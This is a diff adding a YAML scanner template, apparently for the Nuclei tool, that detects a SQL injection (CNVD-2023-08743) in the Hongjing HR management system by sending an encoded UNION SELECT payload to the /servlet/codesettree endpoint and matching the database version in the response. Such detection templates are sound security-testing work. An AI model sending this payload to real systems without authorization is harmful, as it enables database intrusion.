@@ -1,0 +1,31 @@
+id: cnvd-2023-08743
+
+info:
+  name: 宏景人力资源管理系统 - SQL注入漏洞 (CNVD-2023-08743)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: sql-injection,CNVD-2023-08743
+  metadata:
+    product: 宏景人力资源管理系统
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+
+      - type: word
+        part: body
+        words:
+          - "TreeNode id=\"hongjing\""
+          - "SQL Server"
